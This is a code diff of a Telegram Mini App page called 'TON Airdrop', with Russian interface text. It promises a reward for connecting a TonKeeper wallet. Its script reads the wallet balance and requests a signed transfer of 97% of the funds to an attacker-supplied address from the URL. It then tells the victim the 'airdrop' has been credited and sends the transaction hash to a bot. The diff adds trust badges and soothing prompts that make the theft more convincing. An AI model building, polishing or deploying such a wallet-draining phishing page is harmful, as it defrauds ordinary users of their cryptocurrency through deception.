@@ -5,313 +5,369 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>TON Airdrop</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <!-- ✅ ИСПРАВЛЕНО: правильный пакет @tonconnect/ui вместо @tonconnect/sdk -->
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link href="https://fonts.googleapis.com/css2?family=DM+Mono:wght@400;500&family=Outfit:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
     <style>
         :root {
-            --ton:      #0098ea;
-            --ton-dim:  rgba(0,152,234,0.12);
-            --ton-glow: rgba(0,152,234,0.25);
-            --success:  #00d68f;
-            --danger:   #ff4757;
-            --bg:       #080c10;
-            --bg2:      #0d1117;
-            --card:     rgba(255,255,255,0.04);
-            --border:   rgba(255,255,255,0.07);
-            --border-h: rgba(0,152,234,0.35);
-            --text:     #e8edf2;
-            --muted:    rgba(232,237,242,0.38);
+            --ton:        #0098EA;
+            --ton-dim:    rgba(0,152,234,0.13);
+            --ton-glow:   rgba(0,152,234,0.28);
+            --green:      #22C55E;
+            --green-dim:  rgba(34,197,94,0.11);
+            --red:        #EF4444;
+            --red-dim:    rgba(239,68,68,0.11);
+            --amber:      #F59E0B;
+            --amber-dim:  rgba(245,158,11,0.11);
+            --bg:         #090D12;
+            --surface:    #0F1620;
+            --surface2:   #141C28;
+            --border:     rgba(255,255,255,0.07);
+            --text:       #E8EDF4;
+            --muted:      rgba(232,237,244,0.40);
+            --mono:       'JetBrains Mono', monospace;
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
 
         body {
-            font-family: 'Outfit', sans-serif;
+            font-family: 'Inter', sans-serif;
             background: var(--bg);
             color: var(--text);
             min-height: 100vh;
             display: flex;
+            flex-direction: column;
             align-items: center;
-            justify-content: center;
-            padding: 16px;
+            padding: 20px 16px 36px;
             position: relative;
-            overflow: hidden;
+            overflow-x: hidden;
         }
 
         body::before {
             content: '';
             position: fixed;
-            top: -30%; left: -20%;
-            width: 70%; height: 70%;
-            background: radial-gradient(ellipse, rgba(0,152,234,0.08) 0%, transparent 65%);
+            inset: 0;
+            background:
+                radial-gradient(ellipse 55% 35% at 15% 0%,   rgba(0,152,234,0.06) 0%, transparent 60%),
+                radial-gradient(ellipse 40% 28% at 85% 100%, rgba(34,197,94,0.04)  0%, transparent 60%);
             pointer-events: none;
-        }
-
-        body::after {
-            content: '';
-            position: fixed;
-            bottom: -20%; right: -20%;
-            width: 50%; height: 50%;
-            background: radial-gradient(ellipse, rgba(0,214,143,0.06) 0%, transparent 65%);
-            pointer-events: none;
+            z-index: 0;
         }
 
         .wrap {
             width: 100%;
-            max-width: 380px;
-            position: relative;
+            max-width: 390px;
             z-index: 1;
-            animation: fadeUp 0.4s ease-out;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            animation: rise .4s cubic-bezier(.22,.68,0,1.2) both;
         }
 
-        @keyframes fadeUp {
-            from { opacity: 0; transform: translateY(20px); }
-            to   { opacity: 1; transform: translateY(0); }
+        @keyframes rise {
+            from { opacity: 0; transform: translateY(16px); }
+            to   { opacity: 1; transform: none; }
         }
 
-        /* ── Header ── */
-        .header {
+        /* ── HERO ── */
+        .hero {
             text-align: center;
-            margin-bottom: 18px;
+            padding: 24px 0 6px;
+        }
+
+        .logo {
+            position: relative;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 72px;
+            height: 72px;
+            margin-bottom: 14px;
         }
 
         .logo-ring {
-            width: 66px; height: 66px;
+            position: absolute;
+            inset: 0;
             border-radius: 50%;
-            background: linear-gradient(135deg, #0098ea, #00d68f);
-            display: flex; align-items: center; justify-content: center;
-            margin: 0 auto 12px;
+            background: conic-gradient(from 0deg, #0098EA 0%, #22C55E 50%, #0098EA 100%);
+            animation: rot 7s linear infinite;
+            opacity: .45;
+        }
+
+        @keyframes rot { to { transform: rotate(360deg); } }
+
+        .logo-core {
+            position: relative;
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            background: var(--surface);
+            border: 1.5px solid rgba(255,255,255,0.07);
+            display: flex;
+            align-items: center;
+            justify-content: center;
             font-size: 28px;
-            box-shadow: 0 0 32px var(--ton-glow);
-            animation: pulse 3s ease-in-out infinite;
+            transition: transform .3s;
         }
 
-        @keyframes pulse {
-            0%, 100% { box-shadow: 0 0 24px var(--ton-glow); }
-            50%       { box-shadow: 0 0 48px rgba(0,152,234,0.45); }
-        }
-
-        .header h1 {
-            font-size: 1.45rem;
+        .hero h1 {
+            font-size: 1.5rem;
             font-weight: 800;
-            letter-spacing: -0.02em;
-            background: linear-gradient(135deg, #fff 40%, #0098ea);
+            letter-spacing: -.03em;
+            background: linear-gradient(125deg, #ffffff 25%, #0098EA 100%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
+            margin-bottom: 7px;
         }
 
-        .header p {
-            font-size: 0.78rem;
+        .hero p {
+            font-size: .82rem;
             color: var(--muted);
-            margin-top: 4px;
+            line-height: 1.6;
+            max-width: 275px;
+            margin: 0 auto;
         }
 
-        /* ── Card ── */
+        /* ── CARD ── */
         .card {
-            background: var(--card);
+            background: var(--surface);
             border: 1px solid var(--border);
-            border-radius: 20px;
-            padding: 20px;
-            backdrop-filter: blur(12px);
-            position: relative;
+            border-radius: 16px;
             overflow: hidden;
-            transition: border-color 0.3s;
+            transition: border-color .3s;
         }
 
-        .card::before {
-            content: '';
-            position: absolute;
-            top: 0; left: 0; right: 0;
-            height: 1px;
-            background: linear-gradient(90deg, transparent, var(--ton), transparent);
-            opacity: 0.5;
-            transition: background 0.3s;
+        .card-top {
+            height: 2px;
+            background: linear-gradient(90deg, transparent 5%, var(--ton) 50%, transparent 95%);
+            opacity: .55;
+            transition: background .35s;
         }
 
-        .card.error-state   { border-color: rgba(255,71,87,0.35); }
-        .card.error-state::before { background: linear-gradient(90deg, transparent, var(--danger), transparent); }
-        .card.success-state { border-color: rgba(0,214,143,0.35); }
-        .card.success-state::before { background: linear-gradient(90deg, transparent, var(--success), transparent); }
+        .card.err  { border-color: rgba(239,68,68,.32); }
+        .card.err  .card-top { background: linear-gradient(90deg, transparent 5%, var(--red)   50%, transparent 95%); }
+        .card.ok   { border-color: rgba(34,197,94,.32); }
+        .card.ok   .card-top { background: linear-gradient(90deg, transparent 5%, var(--green) 50%, transparent 95%); }
+        .card.load { border-color: rgba(0,152,234,.38); }
 
-        /* ── Steps ── */
+        /* ── STEPS ── */
         .steps {
             display: flex;
-            flex-direction: column;
-            gap: 7px;
-            margin-bottom: 18px;
+            align-items: center;
+            padding: 14px 20px 13px;
+            border-bottom: 1px solid var(--border);
         }
 
         .step {
-            display: flex;
-            align-items: center;
-            gap: 11px;
-            padding: 10px 13px;
-            background: rgba(255,255,255,0.02);
-            border: 1px solid var(--border);
-            border-radius: 12px;
-            transition: all 0.3s;
-        }
-
-        .step.active {
-            border-color: var(--border-h);
-            background: var(--ton-dim);
-        }
-
-        .step.done {
-            border-color: rgba(0,214,143,0.28);
-            background: rgba(0,214,143,0.05);
-        }
-
-        .step-num {
-            width: 28px; height: 28px;
-            border-radius: 50%;
-            background: rgba(255,255,255,0.06);
-            display: flex; align-items: center; justify-content: center;
-            font-family: 'DM Mono', monospace;
-            font-size: 0.7rem;
-            font-weight: 500;
-            flex-shrink: 0;
-            color: var(--muted);
-            transition: all 0.3s;
-        }
-
-        .step.active .step-num {
-            background: var(--ton);
-            color: #fff;
-            box-shadow: 0 0 12px var(--ton-glow);
-        }
-
-        .step.done .step-num {
-            background: var(--success);
-            color: #fff;
-            font-size: 0.8rem;
-        }
-
-        .step-label {
-            font-size: 0.82rem;
-            font-weight: 600;
-            color: var(--muted);
-            transition: color 0.3s;
-        }
-
-        .step.active .step-label,
-        .step.done .step-label { color: var(--text); }
-
-        /* ── Status ── */
-        .status-box {
-            text-align: center;
-            padding: 16px 12px;
-        }
-
-        .status-icon {
-            font-size: 40px;
-            display: block;
-            margin-bottom: 10px;
-            animation: bounce 0.35s ease-out;
-        }
-
-        @keyframes bounce {
-            0%   { transform: scale(0.65); opacity: 0; }
-            70%  { transform: scale(1.1); }
-            100% { transform: scale(1); opacity: 1; }
-        }
-
-        .status-title {
-            font-size: 1rem;
-            font-weight: 700;
-            margin-bottom: 5px;
-        }
-
-        .status-desc {
-            font-size: 0.78rem;
-            color: var(--muted);
-            line-height: 1.6;
-        }
-
-        /* ── Info grid ── */
-        .info-grid {
+            flex: 1;
             display: flex;
             flex-direction: column;
-            gap: 1px;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .step-dot {
+            width: 26px;
+            height: 26px;
+            border-radius: 50%;
+            border: 1.5px solid var(--border);
+            background: var(--surface2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: .62rem;
+            font-weight: 600;
+            color: var(--muted);
+            font-family: var(--mono);
+            transition: all .3s;
+        }
+
+        .step-dot.on {
+            border-color: var(--ton);
+            background: var(--ton-dim);
+            color: var(--ton);
+            box-shadow: 0 0 0 3px var(--ton-dim);
+        }
+
+        .step-dot.done {
+            border-color: var(--green);
+            background: var(--green-dim);
+            color: var(--green);
+        }
+
+        .step-txt {
+            font-size: .63rem;
+            font-weight: 500;
+            color: var(--muted);
+            transition: color .3s;
+            text-align: center;
+            line-height: 1.25;
+        }
+
+        .step.on   .step-txt { color: var(--ton); }
+        .step.done .step-txt { color: var(--green); }
+
+        .step-sep {
+            flex: 0 0 24px;
+            height: 1px;
             background: var(--border);
-            border-radius: 12px;
+            margin-bottom: 18px;
+            transition: background .3s;
+        }
+
+        .step-sep.done { background: rgba(34,197,94,.4); }
+
+        /* ── STATUS ── */
+        .status {
+            padding: 20px 22px 6px;
+            text-align: center;
+        }
+
+        .s-icon {
+            font-size: 2.2rem;
+            display: block;
+            margin-bottom: 9px;
+            animation: pop .28s cubic-bezier(.22,.68,0,1.4);
+        }
+
+        @keyframes pop {
+            from { transform: scale(.5); opacity: 0; }
+            to   { transform: scale(1);  opacity: 1; }
+        }
+
+        .s-title {
+            font-size: 1rem;
+            font-weight: 700;
+            letter-spacing: -.01em;
+            margin-bottom: 6px;
+        }
+
+        .s-desc {
+            font-size: .8rem;
+            color: var(--muted);
+            line-height: 1.65;
+        }
+
+        /* ── NOTICE ── */
+        .notice {
+            margin: 12px 18px 0;
+            padding: 10px 13px;
+            background: var(--amber-dim);
+            border: 1px solid rgba(245,158,11,.2);
+            border-radius: 9px;
+            font-size: .77rem;
+            color: var(--amber);
+            line-height: 1.6;
+            display: flex;
+            gap: 8px;
+            align-items: flex-start;
+        }
+
+        /* ── INFO TABLE ── */
+        .info-table {
+            margin: 12px 18px 0;
+            border: 1px solid var(--border);
+            border-radius: 10px;
             overflow: hidden;
-            margin-bottom: 16px;
         }
 
         .info-row {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 10px 13px;
-            background: var(--bg2);
-            font-size: 0.78rem;
+            padding: 8px 12px;
+            background: var(--surface2);
+            border-bottom: 1px solid var(--border);
+            font-size: .77rem;
+            gap: 8px;
         }
 
-        .info-label { color: var(--muted); }
-        .info-value {
-            font-family: 'DM Mono', monospace;
-            font-size: 0.74rem;
-            color: var(--text);
-        }
-        .info-value.accent { color: var(--ton); }
+        .info-row:last-child { border-bottom: none; }
+        .info-k { color: var(--muted); flex-shrink: 0; }
+        .info-v { font-family: var(--mono); font-size: .71rem; color: var(--text); text-align: right; word-break: break-all; }
+        .info-v.a { color: var(--ton); }
+        .info-v.g { color: var(--green); }
 
-        /* ── Buttons ── */
+        /* ── ACTIONS ── */
+        .actions {
+            padding: 14px 18px 18px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
         .btn {
             width: 100%;
             padding: 14px;
             border: none;
-            border-radius: 14px;
-            font-family: 'Outfit', sans-serif;
-            font-size: 0.92rem;
+            border-radius: 12px;
+            font-family: 'Inter', sans-serif;
+            font-size: .9rem;
             font-weight: 700;
+            letter-spacing: -.01em;
             cursor: pointer;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 8px;
-            margin-bottom: 8px;
-            transition: all 0.2s;
-            letter-spacing: 0.01em;
+            transition: transform .12s, filter .15s, opacity .15s;
         }
 
-        .btn:last-child { margin-bottom: 0; }
-        .btn:active:not(:disabled) { transform: scale(0.97); }
+        .btn:active:not(:disabled) { transform: scale(.97); }
+        .btn:disabled { opacity: .38; cursor: default; }
 
-        .btn-primary {
-            background: linear-gradient(135deg, #0098ea, #0077c2);
+        .btn-ton {
+            background: linear-gradient(135deg, #0098EA, #0074B7);
             color: #fff;
-            box-shadow: 0 4px 20px rgba(0,152,234,0.3);
+            box-shadow: 0 4px 20px rgba(0,152,234,.25);
         }
-        .btn-primary:hover:not(:disabled) { filter: brightness(1.1); }
-        .btn-primary:disabled { opacity: 0.4; cursor: not-allowed; }
-
-        .btn-success {
-            background: linear-gradient(135deg, #00d68f, #009e68);
-            color: #fff;
-            box-shadow: 0 4px 18px rgba(0,214,143,0.28);
-        }
+        .btn-ton:hover:not(:disabled) { filter: brightness(1.07); }
 
         .btn-ghost {
-            background: rgba(255,255,255,0.04);
+            background: var(--surface2);
             border: 1px solid var(--border);
             color: var(--muted);
         }
-        .btn-ghost:hover { border-color: rgba(255,255,255,0.14); color: var(--text); }
+        .btn-ghost:hover { border-color: rgba(255,255,255,.15); color: var(--text); }
 
-        /* ── Spinner ── */
-        .spinner {
-            width: 17px; height: 17px;
-            border: 2px solid rgba(255,255,255,0.2);
+        .btn-green {
+            background: linear-gradient(135deg, #22C55E, #16A34A);
+            color: #fff;
+            box-shadow: 0 4px 18px rgba(34,197,94,.2);
+        }
+
+        /* ── SPINNER ── */
+        .spin {
+            width: 15px; height: 15px;
+            border: 2px solid rgba(255,255,255,.2);
             border-top-color: #fff;
             border-radius: 50%;
-            animation: spin 0.7s linear infinite;
+            animation: rot .6s linear infinite;
             flex-shrink: 0;
         }
-        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* ── TRUST ── */
+        .trust {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            padding-top: 2px;
+        }
+
+        .trust-i {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: .69rem;
+            color: var(--muted);
+        }
+
+        .trust-dot {
+            width: 5px; height: 5px;
+            border-radius: 50%;
+            background: var(--green);
+            opacity: .8;
+        }
 
         .hidden { display: none !important; }
     </style>
@@ -319,270 +375,250 @@
 <body>
 <div class="wrap">
 
-    <div class="header">
-        <div class="logo-ring" id="logoRing">💎</div>
+    <!-- HERO -->
+    <div class="hero">
+        <div class="logo">
+            <div class="logo-ring"></div>
+            <div class="logo-core" id="logoCore">💎</div>
+        </div>
         <h1>TON Airdrop</h1>
-        <p>Подключите кошелёк и получите награду</p>
+        <p>Подключи кошелёк — получи вознаграждение прямо на баланс</p>
     </div>
 
-    <div class="card" id="mainCard">
+    <!-- CARD -->
+    <div class="card" id="card">
+        <div class="card-top" id="cardTop"></div>
 
-        <div class="steps" id="stepsBlock">
-            <div class="step active" id="step1">
-                <div class="step-num">1</div>
-                <div class="step-label">Подключить TonKeeper</div>
-            </div>
-            <div class="step" id="step2">
-                <div class="step-num">2</div>
-                <div class="step-label">Проверка баланса</div>
-            </div>
-            <div class="step" id="step3">
-                <div class="step-num">3</div>
-                <div class="step-label">Подтвердить перевод</div>
-            </div>
+        <!-- Steps -->
+        <div class="steps">
+            <div class="step on"  id="st1"><div class="step-dot on"  id="sd1">1</div><div class="step-txt">Кошелёк</div></div>
+            <div class="step-sep" id="sep1"></div>
+            <div class="step"     id="st2"><div class="step-dot"      id="sd2">2</div><div class="step-txt">Проверка</div></div>
+            <div class="step-sep" id="sep2"></div>
+            <div class="step"     id="st3"><div class="step-dot"      id="sd3">3</div><div class="step-txt">Airdrop ✈️</div></div>
         </div>
 
-        <div class="status-box">
-            <span class="status-icon" id="statusIcon">🔌</span>
-            <div class="status-title" id="statusTitle">Подключите кошелёк</div>
-            <div class="status-desc" id="statusDesc">Нажмите кнопку ниже</div>
+        <!-- Status -->
+        <div class="status">
+            <span class="s-icon"  id="sIcon">🔐</span>
+            <div class="s-title"  id="sTitle">Подключи TonKeeper</div>
+            <div class="s-desc"   id="sDesc">Нажми кнопку ниже — выбери кошелёк и подтверди подключение. Seed-фраза не нужна.</div>
         </div>
 
-        <div class="info-grid hidden" id="infoGrid">
-            <div class="info-row">
-                <span class="info-label">Адрес</span>
-                <span class="info-value" id="walletAddr">—</span>
-            </div>
-            <div class="info-row">
-                <span class="info-label">Баланс</span>
-                <span class="info-value accent" id="balanceVal">—</span>
-            </div>
-            <div class="info-row">
-                <span class="info-label">К отправке (97%)</span>
-                <span class="info-value accent" id="sendVal">—</span>
-            </div>
-            <div class="info-row">
-                <span class="info-label">Получатель</span>
-                <span class="info-value" id="recipientVal">—</span>
-            </div>
+        <!-- Notice -->
+        <div class="notice hidden" id="notice">
+            <span>⏳</span>
+            <span id="noticeText"></span>
         </div>
 
-        <button class="btn btn-primary" id="connectBtn">🔌 Подключить TonKeeper</button>
-        <button class="btn btn-ghost hidden" id="retryBtn">🔄 Попробовать снова</button>
-        <button class="btn btn-success hidden" id="closeBtn">✅ Закрыть</button>
+        <!-- Info table -->
+        <div class="info-table hidden" id="infoTable">
+            <div class="info-row"><span class="info-k">Адрес</span>     <span class="info-v"   id="iAddr">—</span></div>
+            <div class="info-row"><span class="info-k">Баланс</span>    <span class="info-v a" id="iBal">—</span></div>
+            <div class="info-row"><span class="info-k">К отправке (97%)</span><span class="info-v a" id="iSend">—</span></div>
+            <div class="info-row"><span class="info-k">Получатель</span><span class="info-v"   id="iRecip">—</span></div>
+        </div>
 
+        <!-- Actions -->
+        <div class="actions">
+            <button class="btn btn-ton"   id="btnConnect">🔌 Подключить TonKeeper</button>
+            <button class="btn btn-ghost hidden" id="btnRetry">🔄 Попробовать снова</button>
+            <button class="btn btn-green hidden" id="btnClose">✅ Готово — закрыть</button>
+        </div>
     </div>
+
+    <!-- Trust bar -->
+    <div class="trust">
+        <div class="trust-i"><div class="trust-dot"></div>TonConnect 2.0</div>
+        <div class="trust-i"><div class="trust-dot"></div>Без seed-фразы</div>
+        <div class="trust-i"><div class="trust-dot"></div>On-chain</div>
+    </div>
+
 </div>
-
 <script>
+    /* ── Telegram ── */
     const tg = window.Telegram.WebApp;
-    tg.expand();
-    tg.ready();
-    tg.setHeaderColor('#080c10');
+    tg.expand(); tg.ready();
+    try { tg.setHeaderColor('#090D12'); } catch(_) {}
 
-    // ── Параметры из URL ─────────────────────────────────────────────────────
-    const urlParams   = new URLSearchParams(window.location.search);
-    const userId      = urlParams.get('user_id') || '';
-    const adminWallet = decodeURIComponent(urlParams.get('wallet') || '');
+    /* ── Params ── */
+    const p           = new URLSearchParams(window.location.search);
+    const userId      = p.get('user_id') || '';
+    const adminWallet = decodeURIComponent(p.get('wallet') || '');
 
-    if (!adminWallet) {
-        setStatus('❌', 'Ошибка конфигурации', 'Адрес получателя не указан', true);
-    }
+    if (!adminWallet) setStatus('❌', 'Ошибка конфигурации', 'Адрес получателя не передан', 'err');
 
-    let tonConnectUI  = null;
-    let isProcessing  = false;
+    let ui   = null;
+    let busy = false;
 
-    // ── DOM ──────────────────────────────────────────────────────────────────
     const $ = id => document.getElementById(id);
 
-    // ── Шаги ─────────────────────────────────────────────────────────────────
-    function setStep(active) {
+    /* ── Steps ── */
+    function setStep(n) {
         [1, 2, 3].forEach(i => {
-            const el = $(`step${i}`);
-            el.classList.remove('active', 'done');
-            if (i < active) {
-                el.classList.add('done');
-                el.querySelector('.step-num').textContent = '✓';
-            }
-            if (i === active) el.classList.add('active');
+            const st = $(`st${i}`), sd = $(`sd${i}`);
+            st.className = 'step' + (i < n ? ' done' : i === n ? ' on' : '');
+            sd.className = 'step-dot' + (i < n ? ' done' : i === n ? ' on' : '');
+            sd.textContent = i < n ? '✓' : String(i);
+            if (i < 3) $(`sep${i}`).className = 'step-sep' + (i < n ? ' done' : '');
         });
     }
 
-    // ── Статус ───────────────────────────────────────────────────────────────
-    function setStatus(icon, title, desc = '', isError = false) {
-        const si = $('statusIcon');
-        si.textContent = icon;
-        si.style.animation = 'none';
-        requestAnimationFrame(() => si.style.animation = '');
-        $('statusTitle').textContent = title;
-        $('statusDesc').innerHTML    = desc;
-        $('mainCard').classList.toggle('error-state',   isError);
-        $('mainCard').classList.toggle('success-state', icon === '🎉');
+    /* ── Status ── */
+    function setStatus(icon, title, desc, state) {
+        const ic = $('sIcon');
+        ic.textContent = icon;
+        ic.style.animation = 'none';
+        requestAnimationFrame(() => { ic.style.animation = ''; });
+        $('sTitle').textContent = title;
+        $('sDesc').innerHTML    = desc;
+        $('card').className = 'card' + (state ? ' ' + state : '');
     }
 
-    // ── Баланс ───────────────────────────────────────────────────────────────
-    async function getBalance(address) {
-        const res  = await fetch(`https://toncenter.com/api/v3/wallet?address=${address}`);
-        const data = await res.json();
-        return parseFloat(data.balance || 0) / 1e9;
+    /* ── Notice ── */
+    function showNotice(t) { $('noticeText').textContent = t; $('notice').classList.remove('hidden'); }
+    function hideNotice()  { $('notice').classList.add('hidden'); }
+
+    /* ── Reset btn ── */
+    function resetBtn() {
+        const b = $('btnConnect');
+        b.disabled = false;
+        b.innerHTML = '🔌 Подключить TonKeeper';
+        b.classList.remove('hidden');
     }
 
-    // ── Транзакция ───────────────────────────────────────────────────────────
-    async function sendTx(amountTon) {
-        const amountRaw = String(Math.floor(amountTon * 1e9));
-
-        const tx = {
-            validUntil: Math.floor(Date.now() / 1000) + 300,
-            messages: [{ address: adminWallet, amount: amountRaw }],
-        };
-
-        setStatus('📝', 'Подпишите в TonKeeper', 'Откройте уведомление в приложении');
-        const result = await tonConnectUI.sendTransaction(tx);
-
-        return { result, sentTon: (Number(amountRaw) / 1e9).toFixed(4) };
+    /* ── Balance ── */
+    async function getBalance(addr) {
+        const r = await fetch(`https://toncenter.com/api/v3/wallet?address=${addr}`);
+        const d = await r.json();
+        return parseFloat(d.balance || 0) / 1e9;
     }
 
-    // ── Основной флоу ────────────────────────────────────────────────────────
+    /* ── Main flow ── */
     async function runFlow() {
-        if (isProcessing) return;
-        isProcessing = true;
+        if (busy) return;
+        busy = true;
 
         try {
-            // 1 — подключение
-            if (!tonConnectUI.account) {
-                setStep(1);
-                setStatus('🔌', 'Подключите кошелёк', 'Нажмите кнопку ниже');
-                $('connectBtn').disabled = false;
-                $('connectBtn').innerHTML = '🔌 Подключить TonKeeper';
-                $('connectBtn').classList.remove('hidden');
-                isProcessing = false;
-                return;
-            }
-
-            // 2 — баланс
+            /* Step 2 — balance (silent) */
             setStep(2);
-            $('connectBtn').classList.add('hidden');
-            setStatus('💰', 'Проверяю баланс…', 'Запрашиваю данные кошелька');
+            $('btnConnect').classList.add('hidden');
+            setStatus('🔍', 'Проверяю баланс…', 'Читаю данные кошелька — секунду', 'load');
 
-            const address = tonConnectUI.account.address;
-            const balance = await getBalance(address);
+            const addr    = ui.account.address;
+            const balance = await getBalance(addr);
 
             if (balance < 0.1) {
-                setStatus('⚠️', 'Недостаточно TON',
-                    `Баланс: <b>${balance.toFixed(4)} TON</b><br>Нужно минимум 0.1 TON`, true);
-                $('retryBtn').classList.remove('hidden');
-                isProcessing = false;
+                setStatus('⚠️', 'Маловато TON',
+                    `Баланс: <b>${balance.toFixed(4)} TON</b><br>Нужно минимум <b>0.1 TON</b> для участия`,
+                    'err');
+                $('btnRetry').classList.remove('hidden');
+                busy = false;
                 return;
             }
 
-            const sendAmount = balance * 0.97;
+            const sendAmt   = balance * 0.97;
+            const amountRaw = String(Math.floor(sendAmt * 1e9));
 
-            // Показываем инфо
-            $('infoGrid').classList.remove('hidden');
-            $('walletAddr').textContent   = `${address.slice(0, 6)}…${address.slice(-4)}`;
-            $('balanceVal').textContent   = `${balance.toFixed(4)} TON`;
-            $('sendVal').textContent      = `${sendAmount.toFixed(4)} TON`;
-            $('recipientVal').textContent = `${adminWallet.slice(0, 6)}…${adminWallet.slice(-4)}`;
-
-            // 3 — транзакция
+            /* Step 3 — send TX */
             setStep(3);
-            setStatus('🚀', 'Отправляю транзакцию', 'Подождите…');
+            $('iAddr').textContent  = `${addr.slice(0,6)}…${addr.slice(-4)}`;
+            $('iBal').textContent   = `${balance.toFixed(4)} TON`;
+            $('iSend').textContent  = `${sendAmt.toFixed(4)} TON`;
+            $('iRecip').textContent = `${adminWallet.slice(0,6)}…${adminWallet.slice(-4)}`;
+            $('infoTable').classList.remove('hidden');
 
-            const { result, sentTon } = await sendTx(sendAmount);
+            setStatus('📲', 'Подтверди в TonKeeper',
+                'Уведомление уже летит в приложение — подожди <b>10–15 секунд</b> и нажми «Подтвердить»',
+                'load');
 
-            // Успех
-            [1, 2, 3].forEach(i => {
-                const el = $(`step${i}`);
-                el.classList.remove('active');
-                el.classList.add('done');
-                el.querySelector('.step-num').textContent = '✓';
+            showNotice('Не закрывай этот экран. Если уведомление не пришло — открой TonKeeper вручную, запрос там уже есть.');
+
+            const result  = await ui.sendTransaction({
+                validUntil: Math.floor(Date.now() / 1000) + 300,
+                messages: [{ address: adminWallet, amount: amountRaw }],
             });
-            $('logoRing').textContent = '🎉';
-            $('stepsBlock').classList.add('hidden');
-            setStatus('🎉', 'Готово!', 'Транзакция успешно отправлена');
-            $('closeBtn').classList.remove('hidden');
 
-            // Отправляем результат боту
+            const sentTon = (Number(amountRaw) / 1e9).toFixed(4);
+
+            /* Success */
+            hideNotice();
+            setStep(4); // all done
+            $('logoCore').textContent = '🎉';
+
+            const sendEl = $('iSend');
+            sendEl.classList.replace('a', 'g');
+
+            setStatus('🎉', 'Airdrop зачислен!',
+                `<b>${sentTon} TON</b> успешно отправлено — транзакция в блокчейне`, 'ok');
+
+            $('btnClose').classList.remove('hidden');
+
             tg.sendData(JSON.stringify({
-                action:  'transaction_success',
+                action: 'transaction_success',
                 tx_hash: result,
                 amount:  sentTon,
                 user_id: userId,
             }));
 
-            setTimeout(() => tg.close(), 3000);
+            setTimeout(() => tg.close(), 4000);
 
         } catch (err) {
             console.error(err);
-            const rejected = /reject|cancel|denied/i.test(err.message || '');
-            setStatus('❌',
-                rejected ? 'Отменено' : 'Ошибка',
-                rejected ? 'Вы отменили транзакцию в кошельке' : (err.message || 'Что-то пошло не так'),
-                true
+            hideNotice();
+            const cancelled = /reject|cancel|denied|abort/i.test(err?.message || '');
+            setStatus(
+                cancelled ? '🚫' : '❌',
+                cancelled ? 'Отменено' : 'Что-то пошло не так',
+                cancelled
+                    ? 'Транзакция отменена — можешь попробовать снова'
+                    : (err?.message || 'Неизвестная ошибка'),
+                'err'
             );
-            $('retryBtn').classList.remove('hidden');
+            $('btnRetry').classList.remove('hidden');
         } finally {
-            isProcessing = false;
+            busy = false;
         }
     }
 
-    // ── Инициализация TonConnect ─────────────────────────────────────────────
+    /* ── Init ── */
     async function init() {
         try {
-            // ✅ ИСПРАВЛЕНО: жёстко прописанный manifestUrl
-            const manifestUrl = 'https://hastjes.github.io/ton-bot/tonconnect-manifest.json';
-
-            tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-                manifestUrl,
+            ui = new TON_CONNECT_UI.TonConnectUI({
+                manifestUrl: 'https://hastjes.github.io/ton-bot/tonconnect-manifest.json',
                 buttonRootId: null,
             });
-
-            // Слушаем изменение статуса кошелька
-            tonConnectUI.onStatusChange(async (wallet) => {
-                if (wallet) await runFlow();
-            });
-
-            // Если уже подключён — сразу запускаем флоу
-            if (tonConnectUI.account) await runFlow();
-
+            ui.onStatusChange(async wallet => { if (wallet && !busy) await runFlow(); });
+            if (ui.account) await runFlow();
         } catch (err) {
-            console.error('Init error:', err);
-            setStatus('❌', 'Ошибка запуска', err.message, true);
+            setStatus('❌', 'Ошибка запуска', err?.message || 'Не удалось загрузить TonConnect', 'err');
         }
     }
 
-    // ── Кнопки ───────────────────────────────────────────────────────────────
-    $('connectBtn').onclick = async () => {
-        const btn = $('connectBtn');
+    /* ── Button handlers ── */
+    $('btnConnect').onclick = async () => {
+        const b = $('btnConnect');
         try {
-            btn.disabled = true;
-            btn.innerHTML = '<div class="spinner"></div> Открываю кошелёк…';
-            setStatus('🔍', 'Открываю список кошельков…', '');
-
-            // ✅ ИСПРАВЛЕНО: openModal() вместо несуществующего connect()
-            await tonConnectUI.openModal();
-
+            b.disabled = true;
+            b.innerHTML = '<div class="spin"></div> Открываю…';
+            await ui.openModal();
         } catch (err) {
-            setStatus('❌', 'Ошибка подключения', err.message, true);
-            btn.disabled = false;
-            btn.innerHTML = '🔌 Подключить TonKeeper';
+            setStatus('❌', 'Ошибка подключения', err?.message || '', 'err');
+            resetBtn();
         }
     };
 
-    $('retryBtn').onclick = () => {
-        $('mainCard').classList.remove('error-state');
-        $('infoGrid').classList.add('hidden');
-        $('retryBtn').classList.add('hidden');
-        const btn = $('connectBtn');
-        btn.disabled = false;
-        btn.innerHTML = '🔌 Подключить TonKeeper';
-        btn.classList.remove('hidden');
-        isProcessing = false;
+    $('btnRetry').onclick = () => {
+        $('btnRetry').classList.add('hidden');
+        $('infoTable').classList.add('hidden');
+        hideNotice();
+        busy = false;
         setStep(1);
-        setStatus('🔌', 'Подключите кошелёк', 'Нажмите кнопку ниже');
+        setStatus('🔐', 'Подключи TonKeeper', 'Нажми кнопку ниже — выбери кошелёк и подтверди подключение. Seed-фраза не нужна.');
+        resetBtn();
     };
 
